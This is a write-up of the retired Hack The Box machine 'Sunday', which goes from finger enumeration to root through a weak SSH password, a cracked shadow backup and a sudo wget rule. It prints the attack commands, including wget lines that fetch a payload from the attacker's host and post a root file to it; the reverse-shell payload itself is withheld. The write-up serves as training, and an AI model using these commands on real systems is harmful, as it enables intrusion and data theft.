---
layout: post
title: "The Day the Fetch Boy Ran the House"
subtitle: "HTB Sunday, where a chatty finger daemon names the tenants, a one-word password opens the door, and a download tool wearing root's coat rewrites the script the king is told to run"
date: 2018-10-06 12:00:00 +0000
description: "An old Solaris box that talks too much, trusts a one-word password, and lets a download tool with root's blessing overwrite the very file root is told to run."
image: /assets/og/the-day-the-fetch-boy-ran-the-house.png
tags: [hackthebox, writeup]
---

Sunday is a Solaris machine from a decade nobody misses, and it loses the box one small kindness at a time. First a daemon that exists only to be polite tells you who lives here. Then a tenant whose password is just the day of the week lets you in through a side door at a port nobody scans. Then a forgotten backup of the shadow file, left lying in a folder anyone can read, hands you a second name. And at the end a download tool, blessed with root's signature, is pointed not at the internet but at the one file root has promised to run. Nothing here is forced. Every lock on this box was either propped open or never installed, and the whole climb is a tour of small mercies that add up to a master key.

```
        S U N D A Y   (SunOS)
        =====================
        finger :79   "who lives here?"   → sunny, sammy
                 |
        ssh :22022   sunny / sunday   (a password the size of a weekday)
                 |
        /backup/shadow.backup  world-readable
                 → crack → sammy / cooldude!
                 |
        sudo wget (as root) ──▶ overwrites /root/troll
                 |
        sunny runs sudo /root/troll ... and root falls out
                                            日
```

## 0x01 · the doorman who names the tenants

`nmap` against Sunday comes back strange and old, the kind of fingerprint that makes you check the year. This is not Linux. It is Solaris, SunOS 5.11, and even the port numbers are wearing disguises.

```
PORT      STATE SERVICE  VERSION
79/tcp    open  finger   Sun Solaris fingerd
111/tcp   open  rpcbind
22022/tcp open  ssh      SunSSH 1.3 (protocol 2.0)
```

Two things should make you sit up. SSH is hiding on 22022, not 22, which is the box quietly betting you only scanned the famous ports. And port 79 is `finger`, a protocol so old it predates the idea that a server should keep secrets. Finger's entire job, back when the internet was a few hundred friendly machines, was to answer the question "is so-and-so around right now?" It will happily tell a total stranger who is logged in and when they last showed up. Think of it like a doorman who, when you ask whether Sammy lives in the building, not only says yes but tells you Sammy's full name, which floor, and that he got home at six. Useful, friendly, and a catastrophe the moment the person asking is not a friend.

## 0x02 · asking the doorman about everyone

You do not have to guess names. You hand the doorman a phone book and let him cross off the ones who do not live here. Pentestmonkey's `finger-user-enum` does exactly that, firing one finger query per candidate username and keeping the ones the server confirms.

```
# finger-user-enum.pl -U /usr/share/wordlists/names.txt -t 10.10.10.76
...
sunny@10.10.10.76: Login       Name      TTY     Idle ...
sammy@10.10.10.76: Login       Name      TTY     Idle ...
```

Two real tenants fall out of the wordlist: `sunny` and `sammy`. No password yet, just names. But names are half of a login, and on a box this trusting the other half is barely a wall. Picture casing an apartment building by reading the mailboxes. You still need keys, but now you know whose doors to try, and you have stopped wasting time on apartments that are empty.

## 0x03 · a password the size of a weekday

The box is called Sunday. The user is called `sunny`. There is a temptation, sitting right there, to try the most obvious word in the building, and Sunday rewards laziness the way it punishes nothing. Over on the hidden SSH port, `sunny` with the password `sunday` simply works.

```
# ssh -p 22022 sunny@10.10.10.76
sunny@10.10.10.76's password: sunday
Last login: ...
sunny@sunday:~$ id
uid=65535(sunny) gid=1(other)
```

There is no exploit to write here and no cleverness to claim. The lesson is the absence of one. A password that is a single dictionary word, thematically matched to the box name, is not a secret. It is a hint with a lock icon next to it. Think of it like hiding your spare key under the doormat that says WELCOME. The key is technically out of sight, but you have told the whole street exactly where to look.

## 0x04 · the backup that should not have been readable

Once you are `sunny`, you go looking for the next rung, and Sunday leaves it on the floor. A directory called `/backup` is world-readable, and inside sits a copy of the system's shadow file, the one place a Unix box keeps its password hashes. The real `/etc/shadow` is locked tight. This careless photocopy of it is not.

```
sunny@sunday:~$ ls -l /backup
-rw-r--r--  1 root  root   ...  agent22.backup
-rw-r--r--  1 root  root   ...  shadow.backup
sunny@sunday:~$ cat /backup/shadow.backup
sammy:$5$...$...:...
sunny:$5$...$...:...
```

A password hash is meant to be a one-way street. You can turn the password into the hash, but you are not supposed to be able to walk it backwards. The catch is that "not supposed to" really means "you have to guess the input and check." So you take the `$5$` hashes (that prefix means SHA-256 crypt) and you guess millions of times a second with a wordlist, keeping any guess whose hash matches.

```
# hashcat -m 7400 sunday.hashes /usr/share/wordlists/rockyou.txt
$5$...$...:cooldude!
```

`sammy` cracks to `cooldude!`. Think of a hash like a fingerprint smudged on a glass. You cannot reconstruct the face from the smudge, but if you have a stack of ten million mugshots you can press each one to the glass until a print lines up. The exclamation point did not save Sammy. It was still a word in everyone's list.

## 0x05 · the fetch boy in root's coat

Become `sammy` (his shadow line cracked, so just `su` or SSH back in as him) and ask the only question that matters on a Unix box you half-own. What may you run as root?

```
sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

That is the entire endgame, sitting in one line. `wget` is a download tool. It fetches a file from somewhere and writes it somewhere. Granting it root with no password feels harmless, because surely a download tool just downloads. But "write a file anywhere, as root" is one of the most dangerous powers on the system, because the thing you write can be a file root already trusts.

And Sunday has handed us exactly such a file. Earlier we noticed `sunny` carries his own tiny privilege.

```
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
```

`/root/troll` is a little script that root will run on command. Right now it does nothing but print a taunt and an `id`. But `sammy` can make `wget` write any file, as root, including over the top of `/root/troll`. So you stand up a listener and a one-line script on your own box, then have root's `wget` fetch it down on top of the troll.

```
# on your box, serve a file at http://10.10.14.4/iceberg
#   contents: [ a short script that fires a reverse shell to 10.10.14.4:443 ]

sammy@sunday:~$ sudo /usr/bin/wget http://10.10.14.4/iceberg -O /root/troll
```

I am bracketing the payload, not pasting it, and that is the point rather than squeamishness. The real thing is three lines that hand out a root shell, and the danger is precisely how short and how copyable it is. Picture it instead of typing it.

Now the two privileges click together. `sammy` rewrote the script. `sunny` is allowed to run it as root. So switch back to `sunny`, pull the lever, and catch what falls out.

```
sunny@sunday:~$ sudo /root/troll
# (on your listener)
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.76]
# id
uid=0(root) gid=0(root)
# cat /root/root.txt
████████████████████████████████
```

Think of it like a king who has sworn to read aloud, word for word, whatever is written on a single scroll. The scroll is sacred and locked away. But you bribed the royal errand boy, who happens to be allowed to refill that exact scroll, and you dictated new words. The king keeps his vow perfectly. He reads the scroll. The scroll now reads "give this stranger the crown."

## 0x06 · the long way, because wget has more doors than one

Overwriting `/root/troll` is the tidy path, but `sudo wget` as root is a skeleton key, and it is worth seeing why one bad sudo line is so total. You could overwrite `/etc/shadow` with a hash you know and then just become root with a password you set. You could append a line to `/etc/sudoers` granting yourself everything. You could even read files you have no business reading without ever writing a shell, because `wget` will helpfully quote a file back at you in an error message if you feed it as a bad URL, or POST it to your own server with `--post-file`.

```
# read a file by making wget complain about it
sammy@sunday:~$ sudo wget --input-file=/root/root.txt
... /root/root.txt: Invalid URL ████████████████████████████████ : ...

# or just mail the file to yourself
sammy@sunday:~$ sudo wget --post-file=/root/root.txt http://10.10.14.4/
```

Every one of these is the same disease in a different organ. The moment a single trusted-everywhere program runs as root, every feature it has becomes a privilege you have. That is the same family of mistake the box opened with: a finger daemon whose one feature, answering questions, became your reconnaissance. A tool's helpfulness is only ever as safe as the smallest hand allowed to wield it.

## 0x07 · the honest caveat

It is easy to file Sunday under "ancient Solaris, who cares," and the specific software here is genuinely a museum piece. Nobody is shipping SunSSH 1.3 in 2026. But not one step on this box was a software bug. There was no CVE, no overflow, no clever payload. Every rung was a decision someone made and a fence someone never built.

Finger answered strangers because it was configured to and never reconsidered. The SSH password was a weekday because picking a real one felt like a chore. The shadow file got copied into a world-readable folder because backups feel safe and nobody pictured a stranger reading them. And the crown jewel, the `sudo wget` line, was almost certainly written by an admin who thought "I just need to let Sammy grab a file sometimes." Every single one of these is alive and well in 2026, on Linux, on cloud boxes, in CI pipelines, in `sudoers` files written this morning. The costume is Solaris. The body underneath is a modern company.

The one I would lose sleep over is the sudo line, because it ships green. Nothing was unpatched. No scanner flags `NOPASSWD: /usr/bin/wget` as a vulnerability, because it is not one, it is a policy. You cannot `apt upgrade` your way out of trusting the wrong tool with the wrong scope. Only a human reading that line and asking "what is the worst this can write?" ever closes that door.

## 0x08 · outro

```
the doorman named the tenants because asking was allowed.
the door opened to a weekday because nobody chose a real word.
the hashes leaked from a backup left out in the open.
and the errand boy, wearing root's coat, rewrote the king's own scroll.

no exploit fired. every lock was propped, not picked.
one bad sudo line is a skeleton key with a polite name.

scope the tool. silence the doorman. never name a key after the day. wear black.

                                                            EOF
```

---

*HTB: Sunday, retired 29 Sep 2018. An easy Solaris box that is really a lecture on misplaced trust, where a chatty daemon, a one-word password, and a single overscoped sudo line cost the whole house. No bug was ever required.*